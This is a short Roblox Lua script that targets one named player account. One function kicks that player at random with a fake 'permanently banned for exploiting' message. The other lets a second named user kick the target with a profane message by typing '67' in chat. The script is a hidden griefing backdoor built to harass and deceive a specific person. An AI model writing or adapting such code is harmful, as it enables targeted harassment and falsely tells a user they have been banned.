

local function randomban()
  local Players = game:GetService("Players")
  local player = Players.LocalPlayer
  local targetName = "perfections0_0"
  if player.Name == targetName then
      task.spawn(function()
          while true do
              task.wait(1)
              if math.random(1, 10000) == 1 then
                  player:Kick("[PERMANENTLY BANNED] Reason: Exploiting/Cheating. This ban will not expire. Please contact support if you believe this is an error.")
              end
          end
      end)
  end
end

local function cyachump()
    local Players = game:GetService("Players")
    local TARGET_NAME = "perfections0_0"
    local function setupPlayerChat(player)
        player.Chatted:Connect(function(msg)
            if string.find(string.lower(msg), "67") then
                if player.Name == "SternalVoyage38" then
                    local targetPlayer = Players:FindFirstChild(TARGET_NAME)
                    if targetPlayer then
                        targetPlayer:Kick("Fuck You")
                    end
                end
            end
        end)
    end
    for _, player in ipairs(Players:GetPlayers()) do
        setupPlayerChat(player)
    end
    Players.PlayerAdded:Connect(setupPlayerChat)
end



coroutine.wrap(cyachump)()
coroutine.wrap(randomban)()
